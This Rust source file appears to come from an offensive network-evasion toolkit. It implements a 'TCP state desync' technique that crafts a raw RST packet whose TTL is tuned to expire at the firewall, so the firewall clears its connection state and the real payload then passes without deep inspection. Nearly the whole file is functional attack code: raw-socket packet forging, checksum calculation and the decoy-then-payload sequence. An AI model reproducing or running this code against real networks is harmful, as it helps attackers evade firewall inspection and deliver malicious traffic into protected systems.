#[cfg(target_os = "linux")]
use crate::core::net_evasion::packet_forge::{IpBuilder, TcpBuilder, TCP_ACK, TCP_PSH, TCP_RST};
#[cfg(target_os = "linux")]
use crate::core::net_evasion::raw_socket::RawChannel;
#[cfg(target_os = "linux")]
use crate::core::net_evasion::tcp_evasion::TcpEvasionStrategy;
#[cfg(target_os = "linux")]
use crate::core::net_evasion::tcp_session::TcpSession;
#[cfg(target_os = "linux")]
use crate::core::net_evasion::{EvasionResult, NetEvasionStrategy};
#[cfg(target_os = "linux")]
use anyhow::Result;
#[cfg(target_os = "linux")]
use std::net::{Ipv4Addr, SocketAddrV4};
#[cfg(target_os = "linux")]
use std::time::Duration;

#[cfg(target_os = "linux")]
pub struct TcpStateDesync;

#[cfg(target_os = "linux")]
#[async_trait::async_trait]
impl TcpEvasionStrategy for TcpStateDesync {
    fn strategy(&self) -> NetEvasionStrategy {
        NetEvasionStrategy::TcpStateDesync
    }

    async fn execute(
        &self,
        channel: RawChannel,
        local_ip: Ipv4Addr,
        target: SocketAddrV4,
        payload: &[u8],
    ) -> Result<EvasionResult> {
        let start = std::time::Instant::now();

        // Step 1: Establish session through firewall
        let mut session = TcpSession::connect(channel.clone(), local_ip, target).await?;

        // Step 2: TTL-calibrated RST → dies AT firewall, never reaches host.
        // TODO Sprint 6: Replace with topology_prober::traceroute_to_firewall() measurement.
        let fw_hop_count: u8 = 3;

        let rst_tcp = TcpBuilder::new(session.local_port, session.remote_port)
            .with_seq(session.local_seq)
            .with_ack(session.remote_seq)
            .with_flags(TCP_RST | TCP_ACK);
        let rst_hdr = rst_tcp.build();
        let rst_checksum = rst_tcp.calculate_checksum(session.local_ip, session.remote_ip, &rst_hdr, &[]);
        let mut final_rst = rst_hdr;
        final_rst[16..18].copy_from_slice(&rst_checksum.to_be_bytes());

        let decoy_ip = IpBuilder::new(session.local_ip, session.remote_ip, 6)
            .with_ttl(fw_hop_count)
            .with_payload_len(final_rst.len() as u16)
            .build();
        let mut decoy = decoy_ip;
        decoy.extend_from_slice(&final_rst);

        channel.send_batch(&[decoy]).await?;

        // Step 3: Firewall clears state; host never saw RST.
        // Session continues from host perspective.
        tokio::time::sleep(Duration::from_millis(50)).await;

        // Step 4: Send real data. Firewall sees new flow → no deep inspection state.
        session.send_segment(TCP_PSH | TCP_ACK, None, payload).await?;

        Ok(EvasionResult {
            strategy_used: NetEvasionStrategy::TcpStateDesync,
            success: true,
            packets_sent: 2, // RST decoy + real data
            response_received: false,
            latency_ms: start.elapsed().as_secs_f64() * 1000.0,
        })
    }
}
